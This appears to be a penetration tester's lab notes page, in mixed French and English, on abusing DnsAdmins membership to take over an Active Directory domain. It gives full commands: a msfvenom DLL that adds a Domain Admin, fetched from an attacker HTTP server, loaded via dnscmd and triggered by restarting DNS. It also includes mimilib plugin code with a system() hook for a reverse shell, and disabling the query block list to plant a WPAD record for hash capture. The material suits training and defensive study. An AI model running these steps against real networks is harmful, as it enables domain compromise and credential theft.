# DnsAdmins

***

{% hint style="warning" %}
Les membres du groupe [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) ont accès aux informations DNS sur le réseau. Le service DNS de Windows prend en charge des plugins personnalisés et peut appeler des fonctions de ces plugins pour résoudre des requêtes de noms qui ne sont pas dans le scope des zones DNS hébergées localement.&#x20;

Le service DNS s'exécute en tant que **NT AUTHORITY\SYSTEM**, donc l'appartenance à ce groupe pourrait potentiellement être exploitée pour escalader des privilèges sur un **Contrôleur de Domaine** ou dans une situation où un serveur distinct agit comme serveur DNS pour le domaine. Il est possible d'utiliser l'outil intégré [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) pour spécifier le chemin du fichier DLL du plugin. Comme expliqué dans ce très bon [post](https://adsecurity.org/?p=4064), l'attaque suivante peut être réalisée lorsque DNS est exécuté sur un **Contrôleur de Domaine** (ce qui est très courant) :

* La gestion de DNS se fait via RPC.
* [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nous permet de charger une DLL personnalisée sans aucune vérification du chemin de la DLL. Cela peut être fait avec l'outil **dnscmd** depuis la ligne de commande.
* Lorsque un membre du groupe **DnsAdmins** exécute la commande **dnscmd** ci-dessous, la clé du registre **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll** est remplie.
* Lorsque le service DNS est redémarré, la DLL dans ce chemin sera chargée (c'est-à-dire un partage réseau auquel le compte machine du Contrôleur de Domaine peut accéder).
* Un attaquant peut charger une DLL personnalisée pour obtenir un shell inversé ou même charger un outil tel que **Mimikatz** en tant que DLL pour vider les identifiants.
{% endhint %}

***

### <mark style="color:red;">Leveraging DnsAdmins Access</mark>

<mark style="color:green;">**Generating Malicious DLL**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
{% endcode %}

<mark style="color:green;">**Starting Local HTTP Server**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ python3 -m http.server 7777
```
{% endcode %}

<mark style="color:green;">**Downloading File to Target**</mark>

{% code fullWidth="true" %}
```powershell-session
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```
{% endcode %}

Let's first see what happens if we use the `dnscmd` utility to load a custom DLL with a non-privileged user.

<mark style="color:green;">**Loading DLL as Non-Privileged User**</mark>

{% code fullWidth="true" %}
```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
{% endcode %}

As expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this.

<mark style="color:green;">**Loading DLL as Member of DnsAdmins**</mark>

```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins
```

<mark style="color:green;">**Loading Custom DLL**</mark>

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

<mark style="color:green;">**Finding User's SID**</mark>

```cmd-session
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

<mark style="color:green;">**Checking Permissions on DNS Service**</mark>

Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

{% code fullWidth="true" %}
```cmd-session
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
{% endcode %}

SSDL Syntaxe here

<mark style="color:green;">**Stopping the DNS Service**</mark>

```cmd-session
C:\htb> sc stop dns
```

<mark style="color:green;">**Starting the DNS Service**</mark>

```cmd-session
C:\htb> sc start dns
```

<mark style="color:green;">**Confirming Group Membership**</mark>

```cmd-session
C:\htb> net group "Domain Admins" /dom
```

***

### <mark style="color:blue;">Cleaning Up</mark>

The first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.

```cmd-session
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

<mark style="color:green;">**Deleting Registry Key**</mark>

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

<mark style="color:green;">**Starting the DNS Service Again**</mark>

```cmd-session
C:\htb> sc.exe start dns
```

<mark style="color:green;">**Checking DNS Service Status**</mark>

```cmd-session
C:\htb> sc query dns
```

***

### <mark style="color:green;">Using Mimilib.dll</mark>

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

{% code fullWidth="true" %}
```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```
{% endcode %}

***

### <mark style="color:red;">Creating a WPAD Record</mark>

{% hint style="warning" %}
Une autre manière d’abuser des privilèges du groupe DnsAdmins est de créer un enregistrement WPAD. L’appartenance à ce groupe nous donne les droits de désactiver la sécurité de blocage des requêtes globales, qui par défaut bloque cette attaque. Le serveur 2008 a introduit pour la première fois la possibilité d’ajouter à une liste de blocage de requêtes globales sur un serveur DNS. Par défaut, le protocole de découverte automatique de proxy web (WPAD) et le protocole d’adressage automatique de tunnel intra-site (ISATAP) sont sur la liste de blocage des requêtes globales. Ces protocoles sont assez vulnérables au détournement, et tout utilisateur du domaine peut créer un objet ordinateur ou un enregistrement DNS contenant ces noms.

Après avoir désactivé la liste de blocage des requêtes globales et créé un enregistrement WPAD, chaque machine exécutant WPAD avec les paramètres par défaut verra son trafic proxyfié à travers notre machine d’attaque. Nous pourrions utiliser un outil tel que Responder ou Inveigh pour effectuer une usurpation de trafic, et tenter de capturer des empreintes de mots de passe et de les casser hors ligne ou de réaliser une attaque SMBRelay.
{% endhint %}

<mark style="color:green;">**Disabling the Global Query Block List**</mark>

{% code fullWidth="true" %}
```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
{% endcode %}

<mark style="color:green;">**Adding a WPAD Record**</mark>

{% code fullWidth="true" %}
```powershell-session
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
{% endcode %}
